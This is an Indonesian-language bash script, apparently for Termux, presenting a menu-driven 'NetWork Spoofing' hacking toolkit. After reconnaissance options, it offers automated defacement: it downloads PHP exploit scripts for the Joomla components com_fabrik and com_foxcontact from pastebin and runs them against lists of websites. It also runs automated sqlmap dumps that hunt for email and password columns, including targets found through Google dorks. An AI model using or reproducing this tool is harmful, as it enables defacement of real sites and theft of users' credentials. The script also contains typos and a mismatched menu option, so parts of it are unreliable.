#!/usr/bin/bash
clear
pkg install toilet -y
pkg install curl -y
pkg install ruby -y
pkg install python2 -y
clear
python2 c
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
echo "[$]==============================[$]" | lolcat
echo $blue"{o,o} Code By : Fajar Firdaus"
echo $blue"|)__) Fb : Fajar Firdaus / Ace.of.spades729"
echo $blue" ---  Blog : FajarsHackingTutorial.blogspot.com"
echo "[$]==============================[$]" | lolcat
sleep 1
echo "Selamat Datang Di NetWork Spoofing :) " | lolcat
toilet -f future NetWork Spoofing --gay
echo "[==================================]" | lolcat
echo ""
echo "[===========Website Scan===========]" | lolcat
echo $green"(1).Scan Ip website"
echo $green"(2).Cek Http Header Website"
echo $green"(3).Dns Lookup"
echo $green"(4).Liat Infomasi Website"
echo $green"(5).Port Scan"
echo $green"(6).Subnet Calculator"
echo $green"(7).Tcp port scan"
echo $green"(8).Scan vulnability sql dengan nmap"
echo ""
echo "[===========Website Attacking===========]" | lolcat
echo $blue"(9).> Auto Deface com_fabrik"
echo $blue"(10).> Auto Deface com_foxcontact"
echo $blue"(11).> Auto Dump Database dengan sqlmap"
echo $blue"(12).> Auto Dump Database dengan sqlmap (pakek dork)"
echo $red"(X).> Exit"
echo "[===========Terminal Session===========]" | lolcat
echo $white"╭─root@NetWorkSpoofing"
read -p "╰$ ✏ " r

if [ $r = 1 ]
then
clear
read -p "Masukan IP Website nya : " f
curl https://api.hackertarget.com/reverseiplookup/?q=$f
fi

if [ $r = 2 ]
then
clear
read -p "Masukan Hostname webiste / Url : " f
curl https://api.hackertarget.com/httpheaders/?q=$f
fi

if [ $r = 3 ]
then
clear
read -p "Masukan Hostname webiste / url : " f
curl https://api.hackertarget.com/dnslookup/?q=$f
fi

if [ $r = 4 ]
then
clear
read -p "Masukan Hostname / IP website : " f
curl https://api.hackertarget.com/whois/?q=$f
fi

if [ $r = 5 ]
then
clear
read -p "Masukan IP adress website : " f
curl https://api.hackertarget.com/nmap/?q=$f
fi

if [ $r = 6 ]
then
clear
read -p "Masukan IP website : " f
curl https://api.hackertarget.com/subnetcalc/?q=$f
fi

if [ $r = 7 ]
then
read -p "Masukan IP website : " f
curl curl https://api.hackertarget.com/nmap/?q=$f
fi

if [ $r = 8 ]
then
clear
read -p "Masukan Hostname Website : " f
nmap -sV --script=http-sql-injection.nse $f -p 80
fi

if [ $r = 9 ]
then
clear
pkg install wget -y
pkg install php -y
wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php
read -p "Masukan script deface : " sc
read -p "Masukan list web : " d
php com_fabrik.php $d $sc
fi

if [ $r = 10 ]
then
clear
pkg install php -y
pkg install wget -y
wget https://pastebin.com/raw/EAtSir5V -O com_foxcontact.php
read -p "Masukan Script Deface : " f
read -p "Masukan List web : " a
php com_foxcontact.php $a $f
fi

if [ $r = 11 ]
then
pkg install figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
pip2 install termcolor
cd sqlmap
read -p "Masukan Hostname/linkweb : " r
python2 sqlmap.py -u $r --batch --dbs --tamper=space2comment --level=2 --risk=2 --flush-session --time-sec 10 --search -C mail,password --smart -o "Done"
echo "Dump Selesai silahkan lihat hasil di folder Done"
ls
fi

if [ $r = SQ1 ]
then
pkg instalk figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
read -p "Masukan Dork nya : " d
python2 sqlmap.py -g $d --batch --dbs --tamper=space2comment --level=2 --risk=2 --smart --flush-session --time-sec 15 --search -C mail,password -o Done
echo $red"Dump Selesai silahkan lihat hasil di folder Done"
fi
